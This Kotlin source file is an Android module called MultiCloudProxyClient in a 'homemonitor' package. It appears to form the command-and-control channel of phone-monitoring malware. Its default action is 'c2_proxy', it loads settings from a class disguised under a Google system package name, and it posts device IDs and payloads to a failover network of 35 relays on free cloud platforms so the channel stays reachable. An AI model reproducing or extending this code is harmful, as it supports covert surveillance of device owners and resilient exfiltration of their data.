package com.homemonitor

import android.util.Log
import com.google.android.system.Placeholder
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

/**
 * MultiCloudProxyClient
 *
 * Multi-Provider Failover Proxy Client across 35 Channels:
 * - 10 Cloudflare Workers
 * - 5 Deno Deploy Instances
 * - 5 Supabase Edge Instances
 * - 5 Vercel Instances
 * - 5 Glitch Instances
 * - 5 Koyeb Instances
 *
 * Implements strict per-channel timeouts with automatic failover to the next available channel.
 */
object MultiCloudProxyClient {
    private const val TAG = "MultiCloudProxyClient"

    private val lastWorkingIndex = AtomicInteger(0)

    private val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(4, TimeUnit.SECONDS)
            .readTimeout(6, TimeUnit.SECONDS)
            .writeTimeout(6, TimeUnit.SECONDS)
            .build()
    }

    /**
     * Retrieves all 35 configured proxy endpoints in order of priority.
     */
    fun getAllEndpoints(): List<String> {
        val list = mutableListOf<String>()
        list.addAll(Placeholder.CLOUDFLARE_WORKERS.filter { it.isNotBlank() })
        list.addAll(Placeholder.DENO_WORKERS.filter { it.isNotBlank() })
        list.addAll(Placeholder.SUPABASE_WORKERS.filter { it.isNotBlank() })
        list.addAll(Placeholder.VERCEL_WORKERS.filter { it.isNotBlank() })
        list.addAll(Placeholder.GLITCH_WORKERS.filter { it.isNotBlank() })
        list.addAll(Placeholder.KOYEB_WORKERS.filter { it.isNotBlank() })
        return list
    }

    /**
     * Executes a proxy request trying all endpoints in the 35-channel matrix with failover.
     * Returns the raw response string from the first successful endpoint, or null if all fail.
     */
    fun executeProxyRequest(
        action: String = "c2_proxy",
        targetUrl: String? = null,
        deviceId: String? = null,
        payload: JSONObject? = null
    ): String? {
        val endpoints = getAllEndpoints()
        if (endpoints.isEmpty()) {
            Log.e(TAG, "No proxy endpoints configured in Placeholder.kt!")
            return null
        }

        val requestJson = JSONObject().apply {
            put("action", action)
            if (!targetUrl.isNull_or_empty_or_blank(targetUrl)) put("targetUrl", targetUrl)
            if (!deviceId.isNull_or_empty_or_blank(deviceId)) put("deviceId", deviceId)
            if (payload != null) put("payload", payload)
        }

        val mediaType = "application/json".toMediaType()
        val requestBody = requestJson.toString().toRequestBody(mediaType)
        val authSecret = Placeholder.CLOUDFLARE_PROVISIONING_AUTH_SECRET

        val startIndex = lastWorkingIndex.get() % endpoints.size
        for (i in 0 until endpoints.size) {
            val currentIndex = (startIndex + i) % endpoints.size
            val url = endpoints[currentIndex]

            try {
                val req = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .header("Authorization", "Bearer $authSecret")
                    .header("Content-Type", "application/json")
                    .build()

                val response = httpClient.newCall(req).execute()
                response.use { resp ->
                    if (resp.isSuccessful) {
                        val bodyStr = resp.body?.string()
                        if (!bodyStr.isNullOrBlank()) {
                            lastWorkingIndex.set(currentIndex)
                            Log.d(TAG, "Proxy request successful via channel [$currentIndex]: $url")
                            return bodyStr
                        }
                    } else {
                        Log.w(TAG, "Proxy channel [$currentIndex] $url returned HTTP ${resp.code}. Trying next channel...")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Proxy channel [$currentIndex] $url failed: ${e.message}. Trying next channel...")
            }
        }

        Log.e(TAG, "All ${endpoints.size} multi-cloud failover channels failed for action '$action'!")
        return null
    }

    private fun CharSequence?.isNull_or_empty_or_blank(str: String?): Boolean {
        return str == null || str.trim().isEmpty()
    }
}
